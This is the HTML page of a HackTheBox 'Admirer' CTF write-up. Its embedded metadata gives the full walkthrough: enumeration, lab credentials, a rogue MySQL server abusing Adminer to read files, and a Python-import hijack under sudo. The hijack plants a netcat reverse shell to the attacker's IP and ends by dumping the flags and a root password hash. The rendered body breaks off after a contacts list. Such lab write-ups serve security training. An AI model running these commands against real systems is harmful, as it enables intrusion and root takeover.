@@ -1,0 +1,439 @@
+<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>Admirer | CyFun</title><meta name=keywords content="ctf,hackthebox,penetration-testing,writeup,linux,easy"><meta name=description content="Admirer HackTheBox writeup"><meta name=author content="s4ch"><link rel=canonical href=https://s4ch.github.io/writeups/hackthebox/admirer/><link crossorigin=anonymous href=/assets/css/stylesheet.c5de734fbd88c3d21543485ffbcb1ccdda89a86a780cf987fa00199c41dbc947.css integrity="sha256-xd5zT72Iw9IVQ0hf+8sczdqJqGp4DPmH+gAZnEHbyUc=" rel="preload stylesheet" as=style><link rel=icon href=https://s4ch.github.io/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://s4ch.github.io/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://s4ch.github.io/favicon-32x32.png><link rel=apple-touch-icon href=https://s4ch.github.io/apple-touch-icon.png><link rel=mask-icon href=https://s4ch.github.io/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><link rel=alternate hreflang=en href=https://s4ch.github.io/writeups/hackthebox/admirer/><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--code-block-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><meta property="og:title" content="Admirer "><meta property="og:description" content="Admirer HackTheBox writeup"><meta property="og:type" content="article"><meta property="og:url" content="https://s4ch.github.io/writeups/hackthebox/admirer/"><meta property="og:image" content="https://s4ch.github.io/writeups/hackthebox/admirer/admirer.png"><meta property="article:section" content="writeups"><meta property="article:published_time" content="2020-09-26T20:00:00+00:00"><meta property="article:modified_time" content="2025-08-18T17:55:49+05:30"><meta property="og:see_also" content="https://s4ch.github.io/writeups/hackthebox/tenet/"><meta property="og:see_also" content="https://s4ch.github.io/writeups/hackthebox/scriptkiddie/"><meta property="og:see_also" content="https://s4ch.github.io/writeups/hackthebox/delivery/"><meta property="og:see_also" content="https://s4ch.github.io/writeups/hackthebox/ready/"><meta property="og:see_also" content="https://s4ch.github.io/writeups/hackthebox/laboratory/"><meta property="og:see_also" content="https://s4ch.github.io/writeups/hackthebox/passage/"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://s4ch.github.io/writeups/hackthebox/admirer/admirer.png"><meta name=twitter:title content="Admirer "><meta name=twitter:description content="Admirer HackTheBox writeup"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Writeups","item":"https://s4ch.github.io/writeups/"},{"@type":"ListItem","position":2,"name":"HackTheBox Writeups","item":"https://s4ch.github.io/writeups/hackthebox/"},{"@type":"ListItem","position":3,"name":"Admirer ","item":"https://s4ch.github.io/writeups/hackthebox/admirer/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"Admirer ","name":"Admirer ","description":"Admirer HackTheBox writeup","keywords":["ctf","hackthebox","penetration-testing","writeup","linux","easy"],"articleBody":"Information Name: Admirer Profile: www.hackthebox.eu Difficulty: Easy OS: Linux Points: 20 Overview TL;DR: CTF-like box with a bit of code review for initial access (PHP) and pe (python).\nInstall tools used in this WU on BlackArch Linux:\npacman -S nmap ffuf curl filezilla pwncat Network enumeration Port \u0026 service discovery with nmap.\n# Nmap 7.80 scan initiated Fri Jun 12 13:18:53 2020 as: nmap -sSVC -p- -oA nmap_full 10.10.10.187 Nmap scan report for 10.10.10.187 Host is up (0.020s latency). Not shown: 65532 closed ports PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.3 22/tcp open ssh OpenSSH 7.4p1 Debian 10+deb9u7 (protocol 2.0) | ssh-hostkey: | 2048 4a:71:e9:21:63:69:9d:cb:dd:84:02:1a:23:97:e1:b9 (RSA) | 256 c5:95:b6:21:4d:46:a4:25:55:7a:87:3e:19:a8:e7:02 (ECDSA) |_ 256 d0:2d:dd:d0:5c:42:f8:7b:31:5a:be:57:c4:a9:a7:56 (ED25519) 80/tcp open http Apache httpd 2.4.25 ((Debian)) | http-robots.txt: 1 disallowed entry |_/admin-dir |_http-server-header: Apache/2.4.25 (Debian) |_http-title: Admirer Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Fri Jun 12 13:19:24 2020 -- 1 IP address (1 host up) scanned in 30.72 seconds HTTP discovery Lets’ browse the website: http://10.10.10.187/.\nAt the bottom of the page there is an About button:\nWhen you click on it this reveal a contact form:\nOn HTML source we can see a comment associated to the form.\n\u003cform method=\"post\" action=\"#\"\u003e It seems it was the first rabbit hole.\nHTTP enumeration Let’s try to find some web pages with ffuf:\n$ ffuf -u http://10.10.10.187/FUZZ -r -c -w ~/CTF/tools/SecLists/Discovery/Web-Content/raft-small-words-lowercase.txt -e .txt,.php -fc 403 /'___\\ /'___\\ /'___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v1.1.0-git ________________________________________________ :: Method : GET :: URL : http://10.10.10.187/FUZZ :: Wordlist : FUZZ: /home/cyfun/CTF/tools/SecLists/Discovery/Web-Content/raft-small-words-lowercase.txt :: Extensions : .txt .php :: Follow redirects : true :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200,204,301,302,307,401,403 :: Filter : Response status: 403 ________________________________________________ index.php [Status: 200, Size: 6051, Words: 385, Lines: 154] . [Status: 200, Size: 6051, Words: 385, Lines: 154] robots.txt [Status: 200, Size: 138, Words: 21, Lines: 5] :: Progress: [114801/114801] :: Job [1/1] :: 1739 req/sec :: Duration: [0:01:06] :: Errors: 0 :: There is a robots.txt:\n$ curl http://10.10.10.187/robots.txt User-agent: * # This folder contains personal contacts and creds, so no one -not even robots- should see it - waldo Disallow: /admin-dir This pretty obvious we have to check http://10.10.10.187/admin-dir/ but we get a 403, there isn’t any index so let’s continue with ffuf.\n$ ffuf -u http://10.10.10.187/admin-dir/FUZZ -r -c -w ~/CTF/tools/SecLists/Discovery/Web-Content/raft-small-words-lowercase.txt -e .txt,.php -fc 403 /'___\\ /'___\\ /'___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v1.1.0-git ________________________________________________ :: Method : GET :: URL : http://10.10.10.187/admin-dir/FUZZ :: Wordlist : FUZZ: /home/cyfun/CTF/tools/SecLists/Discovery/Web-Content/raft-small-words-lowercase.txt :: Extensions : .txt .php :: Follow redirects : true :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200,204,301,302,307,401,403 :: Filter : Response status: 403 ________________________________________________ contacts.txt [Status: 200, Size: 350, Words: 19, Lines: 30] credentials.txt [Status: 200, Size: 136, Words: 5, Lines: 12] :: Progress: [114801/114801] :: Job [1/1] :: 1688 req/sec :: Duration: [0:01:08] :: Errors: 0 :: At http://10.10.10.187/admin-dir/contacts.txt we have some name and email addresses:\n########## # admins # ########## # Penny Email: p.wise@admirer.htb ############## # developers # ############## # Rajesh Email: r.nayyar@admirer.htb # Amy Email: a.bialik@admirer.htb # Leonard Email: l.galecki@admirer.htb ############# # designers # ############# # Howard Email: h.helberg@admirer.htb # Bernadette Email: b.rauch@admirer.htb And at http://10.10.10.187/admin-dir/credentials.txt we have some creds:\n[Internal mail account] w.cooper@admirer.htb fgJr6q#S\\W:$P [FTP account] ftpuser %n?4Wz}R$tTF7 [Wordpress account] admin w0rdpr3ss01! FTP access As the FTP port is open we can try to access it with the credentials.\nLet’s launch FileZilla to download the files.\nIt’s also possible to use the CLI:\n$ ftp 10.10.10.187 Connected to 10.10.10.187. 220 (vsFTPd 3.0.3) Name (10.10.10.187:cyfun): ftpuser 331 Please specify the password. Password: 230 Login successful. Remote system type is UNIX. Using binary mode to transfer files. ftp\u003e ls -la 200 PORT command successful. Consider using PASV. 150 Here comes the directory listing. drwxr-x--- 2 0 111 4096 Dec 03 2019 . drwxr-x--- 2 0 111 4096 Dec 03 2019 .. -rw-r--r-- 1 0 0 3405 Dec 02 2019 dump.sql -rw-r--r-- 1 0 0 5270987 Dec 03 2019 html.tar.gz dump.sql contains the table of images displayed on the home page, nothing interesting except the db name admirerdb and knowing it’s served on localhost.\nLet’s extract the website source:\n$ mkdir website \u0026\u0026 tar xaf html.tar.gz -C website There is a w4ld0s_s3cr3t_d1r fodler which is the same as admin-dir and contains the same files except that there is one entry more in credentials.txt.\n$ ls -l website total 28 drwxr-x--- 6 cyfun cyfun 4096 juin 6 2019 assets drwxr-x--- 4 cyfun cyfun 4096 d├⌐c. 2 2019 images -rw-r----- 1 cyfun cyfun 4613 d├⌐c. 3 2019 index.php -rw-r----- 1 cyfun cyfun 134 d├⌐c. 1 2019 robots.txt drwxr-x--- 2 cyfun cyfun 4096 d├⌐c. 2 2019 utility-scripts drwxr-x--- 2 cyfun cyfun 4096 d├⌐c. 2 2019 w4ld0s_s3cr3t_d1r credentials.txt\n[Bank Account] waldo.11 Ezy]m27}OREc$ We can now read the PHP part of index.php:\n\u003c?php $servername = \"localhost\"; $username = \"waldo\"; $password = \"]F7jLHw:*G\u003eUPrTo}~A\"d6b\"; $dbname = \"admirerdb\"; // Create connection $conn = new mysqli($servername, $username, $password, $dbname); // Check connection if ($conn-\u003econnect_error) { die(\"Connection failed: \" . $conn-\u003econnect_error); } $sql = \"SELECT * FROM items\"; $result = $conn-\u003equery($sql); if ($result-\u003enum_rows \u003e 0) { // output data of each row while($row = $result-\u003efetch_assoc()) { echo \"\u003carticle class='thumb'\u003e\"; echo \"\u003ca href='\".$row[\"image_path\"].\"' class='image'\u003e\u003cimg src='\".$row[\"thumb_path\"].\"' alt='' /\u003e\u003c/a\u003e\"; echo \"\u003ch2\u003e\".$row[\"title\"].\"\u003c/h2\u003e\"; echo \"\u003cp\u003e\".$row[\"text\"].\"\u003c/p\u003e\"; echo \"\u003c/article\u003e\"; } } else { echo \"0 results\"; } $conn-\u003eclose(); ?\u003e That gives us the MariaDB credentials.\nBut what will interest us more is what’s inside utility-scripts (accessible publicly).\nwebsite/utility-scripts Γö£ΓöÇΓöÇ admin_tasks.php Γö£ΓöÇΓöÇ db_admin.php Γö£ΓöÇΓöÇ info.php ΓööΓöÇΓöÇ phptest.php So we have:\nadmin_tasks.php: an admin toolkit that is probably vulnerable and we’ll use to gain a shell db_admin.php: leaking MariaDB credentials, it’s the same user as in index.php but the password is different, one of the two must be outdated. info.php: a phpinfo() DOCUMENT_ROOT: /var/www/html disable_functions: default open_basedir: /var/www/html phptest.php: a dummy file Code review Here is the list of possible operations:\nAvailable options: 1) View system uptime 2) View logged in users 3) View crontab (current user only) 4) Backup passwd file (not working) 5) Backup shadow file (not working) 6) Backup web data (not working) 7) Backup database (not working) NOTE: Options 4-7 are currently NOT working because they need root privileges. I'm leaving them in the valid tasks in case I figure out a way to securely run code as root from a PHP page. And that’s the vulnerable code without the comments and HTML:\n\u003c?php if(isset($_REQUEST['task'])) { $task = $_REQUEST['task']; if($task == '1' || $task == '2' || $task == '3' || $task == '4' || $task == '5' || $task == '6' || $task == '7') { echo str_replace(\"\\n\", \"\n\", shell_exec(\"/opt/scripts/admin_tasks.sh $task 2\u003e\u00261\")); } else { echo(\"Invalid task.\"); } } ?\u003e The task number is directly passed into a shell_exec() without any security so we would have been able to do a system command injection if task was not compared to a whitelist of allowed task number. It’s a loose comparison so there is maybe a way to bypass it.\nAdminer exploitation In the end admin_tasks.php seems to be a rabbit hole.\nNow there is a step requiring guessing. In db_admin.php there is a comment:\nTODO: Finish implementing this or find a better open source alternative\nhttp://10.10.10.187/utility-scripts/db_admin.php gives a 404, so maybe the dev found an alternative.\nAn alternative to db_admin.php is Adminer (formerly phpMinAdmin) that is similar to phpMyAdmin. Also Adminer is the name of the box…\nFrom adminer.org\nAdminer (formerly phpMinAdmin) is a full-featured database management tool written in PHP. Conversely to phpMyAdmin, it consist of a single file ready to deploy to the target server. Adminer is available for MySQL, MariaDB, PostgreSQL, SQLite, MS SQL, Oracle, Firebird, SimpleDB, Elasticsearch and MongoDB.\nWe can access to http://10.10.10.187/utility-scripts/adminer.php\nBut we can’t login with both set of credentials we found earlier.\nWe are using Adminer 4.6.2, so let’s see if there are security fix in 4.6.3.\nRef. changelog\nWe can see MySQL: Disallow LOAD DATA LOCAL INFILE which was used in Adminer 4.6.2 file disclosure vulnerability.\nAdminer versions up to (and including) 4.6.2 supported the use of the SQL statement LOAD DATA INFILE. It was possible to use this SQL statement to read arbitrary local files because of a protocol flaw in MySQL.\nSo let’s read the associated references:\nAdminer leaks passwords; Magecart hackers rejoice Adminer Script Results to Pwning Server?, Private Bug Bounty Program So we need to host a database and access it remotely from Adminer.\nBy searching around, I found this msf issue: [Suggestion] Add rogue MySQL server for file theft. bcoles asked msf team to create of rogue server module for this kind of exploit. There is still nothing in msf but the author gave an example with this python script: https://github.com/Gifts/Rogue-MySql-Server\nLet’s run it so start the fake database as a daemon:\n$ python2 rogue_mysql_server.py In rogue_mysql_server.py I changed the filelist to read /etc/passwd instead of c:\\windows\\win.ini.\nfilelist = ( # r'c:\\boot.ini', # r'c:\\windows\\win.ini', # r'c:\\windows\\system32\\drivers\\etc\\hosts', '/etc/passwd', # '/etc/shadow', ) We can login by setting our IP address and put whatever credentials.\nYet we can’t read /etc/passwd because of open_basedir value.\nThe file we need to read is index.php with the up-to-date credentials.\nWe can change filelist (add '/var/www/html/index.php') again and restart the rogue server.\nThen if we read the rogue server’s logs:\n$ cat mysql.log | grep password ... $password = \"\u0026\"; ... The we can re-use those credentials over SSH:\n$ ssh waldo@10.10.10.187 waldo@10.10.10.187's password: Linux admirer 4.9.0-12-amd64 x86_64 GNU/Linux The programs included with the Devuan GNU/Linux system are free software; the exact distribution terms for each program are described in the individual files in /usr/share/doc/*/copyright. Devuan GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent permitted by applicable law. You have new mail. Last login: Sun Jul 12 16:20:44 2020 from 10.10.14.36 waldo@admirer:~$ Privilege Escalation of Machine The way to follow seems obvious:\nwaldo@admirer:~$ sudo -l [sudo] password for waldo: Matching Defaults entries for waldo on admirer: env_reset, env_file=/etc/sudoenv, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin, listpw=always User waldo may run the following commands on admirer: (ALL) SETENV: /opt/scripts/admin_tasks.sh So let’s read the script /opt/scripts/admin_tasks.sh:\n#!/bin/bash view_uptime() { /usr/bin/uptime -p } view_users() { /usr/bin/w } view_crontab() { /usr/bin/crontab -l } backup_passwd() { if [ \"$EUID\" -eq 0 ] then echo \"Backing up /etc/passwd to /var/backups/passwd.bak...\" /bin/cp /etc/passwd /var/backups/passwd.bak /bin/chown root:root /var/backups/passwd.bak /bin/chmod 600 /var/backups/passwd.bak echo \"Done.\" else echo \"Insufficient privileges to perform the selected operation.\" fi } backup_shadow() { if [ \"$EUID\" -eq 0 ] then echo \"Backing up /etc/shadow to /var/backups/shadow.bak...\" /bin/cp /etc/shadow /var/backups/shadow.bak /bin/chown root:shadow /var/backups/shadow.bak /bin/chmod 600 /var/backups/shadow.bak echo \"Done.\" else echo \"Insufficient privileges to perform the selected operation.\" fi } backup_web() { if [ \"$EUID\" -eq 0 ] then echo \"Running backup script in the background, it might take a while...\" /opt/scripts/backup.py \u0026 else echo \"Insufficient privileges to perform the selected operation.\" fi } backup_db() { if [ \"$EUID\" -eq 0 ] then echo \"Running mysqldump in the background, it may take a while...\" #/usr/bin/mysqldump -u root admirerdb \u003e /srv/ftp/dump.sql \u0026 /usr/bin/mysqldump -u root admirerdb \u003e /var/backups/dump.sql \u0026 else echo \"Insufficient privileges to perform the selected operation.\" fi } # Non-interactive way, to be used by the web interface if [ $# -eq 1 ] then option=$1 case $option in 1) view_uptime ;; 2) view_users ;; 3) view_crontab ;; 4) backup_passwd ;; 5) backup_shadow ;; 6) backup_web ;; 7) backup_db ;; *) echo \"Unknown option.\" \u003e\u00262 esac exit 0 fi # Interactive way, to be called from the command line options=(\"View system uptime\" \"View logged in users\" \"View crontab\" \"Backup passwd file\" \"Backup shadow file\" \"Backup web data\" \"Backup DB\" \"Quit\") echo echo \"[[[ System Administration Menu ]]]\" PS3=\"Choose an option: \" COLUMNS=11 select opt in \"${options[@]}\"; do case $REPLY in 1) view_uptime ; break ;; 2) view_users ; break ;; 3) view_crontab ; break ;; 4) backup_passwd ; break ;; 5) backup_shadow ; break ;; 6) backup_web ; break ;; 7) backup_db ; break ;; 8) echo \"Bye!\" ; break ;; *) echo \"Unknown option.\" \u003e\u00262 esac done exit 0 backup_shadow and backup_passwd seem secure, backup_db won’t help us so let’s dig in backup_web.\nbackup_web() { if [ \"$EUID\" -eq 0 ] then echo \"Running backup script in the background, it might take a while...\" /opt/scripts/backup.py \u0026 else echo \"Insufficient privileges to perform the selected operation.\" fi } It just launch /opt/scripts/backup.py, let’s see that:\n#!/usr/bin/python3 from shutil import make_archive src = '/var/www/html/' # old ftp directory, not used anymore #dst = '/srv/ftp/html' dst = '/var/backups/html' make_archive(dst, 'gztar', src) It looks like we’ll have to mess with the python import system.\nI won’t explain to much here, if you want to understand the attack please read SIGSEGv1 Quals 2018 - Write-ups - 100 - Fun avec python - App-Script.\n$ mkdir -p /tmp/cyfun/ $ cd /tmp/cyfun/ $ vim.tiny shutil.py shutil.py (a reverse-shell because spawning a PTY is useless as the python script is sent to background)\ndef make_archive(no,ra,j): import os os.system(\"nc 10.10.15.31 8888 -e /bin/bash\") Start a pwncat listener: pwncat -l 8888 -vv.\nThen let’s call the script:\n$ sudo PYTHONPATH=/tmp/cyfun/ /opt/scripts/admin_tasks.sh [[[ System Administration Menu ]]] 1) View system uptime 2) View logged in users 3) View crontab 4) Backup passwd file 5) Backup shadow file 6) Backup web data 7) Backup DB 8) Quit Choose an option: 6 Running backup script in the background, it might take a while... On our listener:\n$ pwncat -l 8888 -vv INFO: Listening on :::8888 (family 10/IPv6, TCP) INFO: Listening on 0.0.0.0:8888 (family 2/IPv4, TCP) INFO: Client connected from 10.10.10.187:33374 (family 2/IPv4, TCP) id uid=0(root) gid=0(root) groups=0(root) pwd /tmp/cyfun cd /root cat root.txt 9e96b615438b09b210be126a5e7d0577 cat /home/waldo/user.txt 30a8ad9cb41261bf0f97f75094358045 cat /etc/shadow | grep root root:$6$M5g.E5/j$AO7lZNZXLFABZld5uGh/YB3J1Va4AG9Tmw1icvm2MsDOj6B1RFloUmnA9jcj4DIsILOedBvVQg66CVjGrd.fl0:18374:0:99999:7::: ","wordCount":"2369","inLanguage":"en","image":"https://s4ch.github.io/writeups/hackthebox/admirer/admirer.png","datePublished":"2020-09-26T20:00:00Z","dateModified":"2025-08-18T17:55:49+05:30","author":{"@type":"Person","name":"s4ch"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://s4ch.github.io/writeups/hackthebox/admirer/"},"publisher":{"@type":"Organization","name":"CyFun","logo":{"@type":"ImageObject","url":"https://s4ch.github.io/favicon.ico"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://s4ch.github.io/ accesskey=h title="CyFun (Alt + H)">CyFun</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)">
+<svg id="moon" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg>
+<svg id="sun" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button><ul class=lang-switch><li>|</li></ul></div></div><ul id=menu><li><a href=https://s4ch.github.io/about/ title=About><span>About</span></a></li><li><a href=https://s4ch.github.io/archives title=Blog><span>Blog</span></a></li><li><a href=https://s4ch.github.io/contact/ title=Contact><span>Contact</span></a></li><li><a href=https://s4ch.github.io/writeups/ title=Writeups><span>Writeups</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><h1 class="post-title entry-hint-parent">Admirer</h1><div class=post-description>Admirer HackTheBox writeup</div><div class=post-meta><span title='2020-09-26 20:00:00 +0000 UTC'>September 26, 2020</span>&nbsp;·&nbsp;12 min&nbsp;·&nbsp;2369 words&nbsp;·&nbsp;s4ch</div></header><figure class=entry-cover><img loading=eager src=https://s4ch.github.io/writeups/hackthebox/admirer/admirer.png alt="Admirer HackTheBox Machine"><p>Admirer - Easy Linux Machine</p></figure><div class=toc><details><summary accesskey=c title="(Alt + C)"><span class=details>Table of Contents</span></summary><div class=inner><nav id=TableOfContents><ul><li><a href=#overview>Overview</a><ul><li><a href=#network-enumeration>Network enumeration</a></li><li><a href=#http-discovery>HTTP discovery</a></li><li><a href=#http-enumeration>HTTP enumeration</a></li><li><a href=#ftp-access>FTP access</a></li><li><a href=#code-review>Code review</a></li><li><a href=#adminer-exploitation>Adminer exploitation</a></li><li><a href=#privilege-escalation-of-machine>Privilege Escalation of Machine</a></li></ul></li></ul></nav></div></details></div><div class=post-content><h1 id=information>Information<a hidden class=anchor aria-hidden=true href=#information>#</a></h1><ul><li><strong>Name:</strong> Admirer</li><li><strong>Profile:</strong> <a href=https://www.hackthebox.eu/home/machines/profile/248>www.hackthebox.eu</a></li><li><strong>Difficulty:</strong> Easy</li><li><strong>OS:</strong> Linux</li><li><strong>Points:</strong> 20</li></ul><h2 id=overview>Overview<a hidden class=anchor aria-hidden=true href=#overview>#</a></h2><p><strong>TL;DR</strong>: CTF-like box with a bit of code review for initial access (PHP) and pe (python).</p><p>Install tools used in this WU on BlackArch Linux:</p><pre tabindex=0><code>pacman -S nmap ffuf curl filezilla pwncat
+</code></pre><h3 id=network-enumeration>Network enumeration<a hidden class=anchor aria-hidden=true href=#network-enumeration>#</a></h3><p>Port & service discovery with <a href=https://nmap.org/>nmap</a>.</p><pre tabindex=0><code># Nmap 7.80 scan initiated Fri Jun 12 13:18:53 2020 as: nmap -sSVC -p- -oA nmap_full 10.10.10.187
+Nmap scan report for 10.10.10.187
+Host is up (0.020s latency).
+Not shown: 65532 closed ports
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     vsftpd 3.0.3
+22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u7 (protocol 2.0)
+| ssh-hostkey:
+|   2048 4a:71:e9:21:63:69:9d:cb:dd:84:02:1a:23:97:e1:b9 (RSA)
+|   256 c5:95:b6:21:4d:46:a4:25:55:7a:87:3e:19:a8:e7:02 (ECDSA)
+|_  256 d0:2d:dd:d0:5c:42:f8:7b:31:5a:be:57:c4:a9:a7:56 (ED25519)
+80/tcp open  http    Apache httpd 2.4.25 ((Debian))
+| http-robots.txt: 1 disallowed entry
+|_/admin-dir
+|_http-server-header: Apache/2.4.25 (Debian)
+|_http-title: Admirer
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Fri Jun 12 13:19:24 2020 -- 1 IP address (1 host up) scanned in 30.72 seconds
+</code></pre><h3 id=http-discovery>HTTP discovery<a hidden class=anchor aria-hidden=true href=#http-discovery>#</a></h3><p>Lets&rsquo; browse the website: http://10.10.10.187/.</p><p>At the bottom of the page there is an About button:</p><p><img loading=lazy src=https://i.imgur.com/Bs16XBS.jpg alt></p><p>When you click on it this reveal a contact form:</p><p>On HTML source we can see a comment associated to the form.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-html data-lang=html><span style=display:flex><span>&lt;<span style=color:#f92672>form</span> <span style=color:#a6e22e>method</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;post&#34;</span> <span style=color:#a6e22e>action</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;#&#34;</span>&gt;<span style=color:#75715e>&lt;!-- Still under development... This does not send anything yet, but it looks nice! --&gt;</span>
+</span></span></code></pre></div><p>It seems it was the first rabbit hole.</p><h3 id=http-enumeration>HTTP enumeration<a hidden class=anchor aria-hidden=true href=#http-enumeration>#</a></h3><p>Let&rsquo;s try to find some web pages with <a href=https://github.com/ffuf/ffuf>ffuf</a>:</p><pre tabindex=0><code>$ ffuf -u http://10.10.10.187/FUZZ -r -c -w ~/CTF/tools/SecLists/Discovery/Web-Content/raft-small-words-lowercase.txt -e .txt,.php -fc 403
+
+        /&#39;___\  /&#39;___\           /&#39;___\
+       /\ \__/ /\ \__/  __  __  /\ \__/
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
+         \ \_\   \ \_\  \ \____/  \ \_\
+          \/_/    \/_/   \/___/    \/_/
+
+       v1.1.0-git
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://10.10.10.187/FUZZ
+ :: Wordlist         : FUZZ: /home/cyfun/CTF/tools/SecLists/Discovery/Web-Content/raft-small-words-lowercase.txt
+ :: Extensions       : .txt .php
+ :: Follow redirects : true
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200,204,301,302,307,401,403
+ :: Filter           : Response status: 403
+________________________________________________
+
+index.php               [Status: 200, Size: 6051, Words: 385, Lines: 154]
+.                       [Status: 200, Size: 6051, Words: 385, Lines: 154]
+robots.txt              [Status: 200, Size: 138, Words: 21, Lines: 5]
+:: Progress: [114801/114801] :: Job [1/1] :: 1739 req/sec :: Duration: [0:01:06] :: Errors: 0 ::
+</code></pre><p>There is a <code>robots.txt</code>:</p><pre tabindex=0><code>$ curl http://10.10.10.187/robots.txt
+User-agent: *
+
+# This folder contains personal contacts and creds, so no one -not even robots- should see it - waldo
+Disallow: /admin-dir
+</code></pre><p>This pretty obvious we have to check http://10.10.10.187/admin-dir/ but we get a
+403, there isn&rsquo;t any index so let&rsquo;s continue with <a href=https://github.com/ffuf/ffuf>ffuf</a>.</p><pre tabindex=0><code>$ ffuf -u http://10.10.10.187/admin-dir/FUZZ -r -c -w ~/CTF/tools/SecLists/Discovery/Web-Content/raft-small-words-lowercase.txt -e .txt,.php -fc 403
+
+        /&#39;___\  /&#39;___\           /&#39;___\
+       /\ \__/ /\ \__/  __  __  /\ \__/
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
+         \ \_\   \ \_\  \ \____/  \ \_\
+          \/_/    \/_/   \/___/    \/_/
+
+       v1.1.0-git
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://10.10.10.187/admin-dir/FUZZ
+ :: Wordlist         : FUZZ: /home/cyfun/CTF/tools/SecLists/Discovery/Web-Content/raft-small-words-lowercase.txt
+ :: Extensions       : .txt .php
+ :: Follow redirects : true
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200,204,301,302,307,401,403
+ :: Filter           : Response status: 403
+________________________________________________
+
+contacts.txt            [Status: 200, Size: 350, Words: 19, Lines: 30]
+credentials.txt         [Status: 200, Size: 136, Words: 5, Lines: 12]
+:: Progress: [114801/114801] :: Job [1/1] :: 1688 req/sec :: Duration: [0:01:08] :: Errors: 0 ::
+</code></pre><p>At http://10.10.10.187/admin-dir/contacts.txt we have some name and email
+addresses:</p><pre tabindex=0><code>##########
+# admins #
+##########
+# Penny
+Email: p.wise@admirer.htb
+
+##############
+# developers #
+##############
+# Rajesh
+Email: r.nayyar@admirer.htb
+
+# Amy
+Email: a.bialik@admirer.htb
+
+# Leonard
+Email: l.galecki@admirer.htb
+
+#############
+# designers #
+#############
+# Howard
+Email: h.helberg@admirer.htb
+
+# Bernadette
+Email: b.rauch@admirer.htb
